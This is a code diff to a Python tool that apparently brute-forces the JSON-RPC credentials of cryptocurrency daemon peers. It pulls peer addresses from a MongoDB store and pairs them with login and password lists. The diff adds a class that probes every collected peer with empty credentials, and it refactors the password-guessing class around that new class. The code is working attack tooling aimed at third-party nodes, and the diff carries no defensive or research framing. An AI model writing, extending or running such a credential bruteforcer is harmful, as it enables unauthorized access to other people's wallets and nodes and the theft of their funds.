@@ -18,32 +18,33 @@ class BruterBase:
     _DataCount = namedtuple('DataCount', ['count', 'data'])
 
     def __init__(self, **kwargs):
+        self.mongo_jsonrpc = PyMongoDB(db_name='jsonrpc', uri=kwargs.get('mongo_uri'))
         self.brute_order = kwargs.get('brute_order')
         self.num_threads = kwargs.get('threads')
-        self._coin_name = kwargs.get('coin_name')
+        self.coin_name = kwargs.get('coin_name')
         self._unordered_data = {
-            'H': PyMongoDB(db_name='jsonrpc', uri=kwargs.get('mongo_uri')),
+            'H': self.mongo_jsonrpc,
             'L': kwargs.get('logins'),
             'P': kwargs.get('passwords'),
         }
 
     @staticmethod
-    def _prepare_data_from_db(docs):
+    def _prepare_peers(docs):
         return (
             f'{document["peer"]}:{document["jsonrpc"]}'
             for document in docs
         )
 
-    def _get_data_from_db(self, data, skip, limit):
-        documents = data.find_many(
+    def get_peers_from_db(self, skip, limit):
+        documents = self.mongo_jsonrpc.find_many(
             data={'jsonrpc': {'$gt': 0}},
-            collection=self._coin_name,
+            collection=self.coin_name,
             skip=skip,
             limit=limit,
             to_list=False
         )
 
-        return self._prepare_data_from_db(documents)
+        return self._prepare_peers(documents)
 
     @staticmethod
     def _get_data_from_file(data, start, end):
@@ -59,18 +60,18 @@ class BruterBase:
         if isinstance(data, str):
             genexpr = self._get_data_from_file(data, start, end)
         else:
-            genexpr = self._get_data_from_db(data, start, end)
+            genexpr = self.get_peers_from_db(start, end)
 
         return genexpr
 
-    def _get_single_data_from_db(self, data, point):
+    def _get_peer_from_db(self, point):
         params = {
             'data': {'jsonrpc': {'$gt': 0}},
-            'collection': self._coin_name,
+            'collection': self.coin_name,
             'skip': point
         }
 
-        document = data.find_one(**params)
+        document = self.mongo_jsonrpc.find_one(**params)
         return f'{document["peer"]}:{document["jsonrpc"]}'
 
     @staticmethod
@@ -83,7 +84,7 @@ class BruterBase:
         if isinstance(data, str):
             return self._get_single_data_from_file(data, point + 1)
         else:
-            return self._get_single_data_from_db(data, point)
+            return self._get_peer_from_db(point)
 
     @property
     def _sorted_brute_order_data(self):
@@ -94,7 +95,7 @@ class BruterBase:
     def _els_amount_in_data(self, data):
         try:
             count = data.count(
-                collection=self._coin_name,
+                collection=self.coin_name,
                 filter_={'jsonrpc': {'$gt': 0}}
             )
         except TypeError:
@@ -124,32 +125,70 @@ class BruterBase:
                     yield first_val, second_val, third_range
 
 
-class JSONRPCBruter(BruterBase):
+class EmptyCredentialsChecker(BruterBase):
     _wait_timeout = 10
 
     def __init__(self, **kwargs):
-        super(JSONRPCBruter, self).__init__(**kwargs)
+        super(EmptyCredentialsChecker, self).__init__(**kwargs)
         self._read_timeout = kwargs.get('read_timeout')
-        self._cycle_timeout = kwargs.get('cycle_timeout')
+        self._loop = kwargs.get('loop')
+        self._loop.run_until_complete(self.check_peers_with_empty_creds())
 
     @staticmethod
-    async def _close_gram_sessions(grams):
+    async def close_gram_sessions(grams):
         [await gram.close_session() for gram in grams]
 
     @staticmethod
-    async def _get_uri(host, login, pwd):
+    async def _get_uri_with_creds(host, login, pwd):
         return f'http://{login}:{pwd}@{host}'
 
-    async def _bruteforce(self, host, login, password, gram):
-        uri = await self._get_uri(host.split('//')[1], login, password)
+    async def _uri_handler(self, host, login, pwd):
+        if login and pwd:
+            uri = await self._get_uri_with_creds(host.split('//')[1], login, pwd)
+        else:
+            uri = host
+
+        return uri
+
+    async def bruteforce(self, host, login=None, password=None, gram=None):
+        uri = await self._uri_handler(host, login, password)
         blockchain = Blockchain(url=uri, gram=gram, read_timeout=self._read_timeout)
 
         try:
             await asyncio.wait_for(blockchain.get_difficulty(), self._wait_timeout)
         except bitcoinerrors.IncorrectCreds:
             pass
+        except bitcoinerrors.NoConnectionToTheDaemon:
+            pass
         except asyncio.futures.TimeoutError:
             pass
+
+    async def _checker_handler(self, non_checked_peers, grams):
+        await asyncio.gather(
+            *(self.bruteforce(peer, gram=gram) for peer, gram in zip(non_checked_peers, grams))
+        )
+
+    @property
+    def _peers_count(self):
+        return self.mongo_jsonrpc.count(
+            collection=self.coin_name,
+            filter_={'jsonrpc': {'$gt': 0}}
+        )
+
+    async def check_peers_with_empty_creds(self):
+        grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]
+
+        for point in range(0, self._peers_count, self.num_threads):
+            non_checked_peers = self.get_peers_from_db(point, self.num_threads)
+            await self._checker_handler(non_checked_peers, grams)
+
+        await self.close_gram_sessions(grams)
+
+
+class JSONRPCBruter(EmptyCredentialsChecker):
+    def __init__(self, **kwargs):
+        super(JSONRPCBruter, self).__init__(**kwargs)
+        self._cycle_timeout = kwargs.get('cycle_timeout')
 
     def _get_sorted_data(self, data):
         return map(
@@ -158,7 +197,7 @@ class JSONRPCBruter(BruterBase):
 
     async def _bruteforce_handler(self, args, rng, grams):
         await asyncio.gather(
-            *(self._bruteforce(*self._get_sorted_data((*args, val)), gram)
+            *(self.bruteforce(*self._get_sorted_data((*args, val)), gram)
               for val, gram in zip(rng, grams))
         )
 
@@ -169,6 +208,6 @@ class JSONRPCBruter(BruterBase):
             for *args, rng in self.brute_data:
                 await self._bruteforce_handler(args, rng=rng, grams=grams)
 
-            await self._close_gram_sessions(grams)
-            time.sleep(self._cycle_timeout)
+            await self.close_gram_sessions(grams)
+            # time.sleep(self._cycle_timeout)
             break
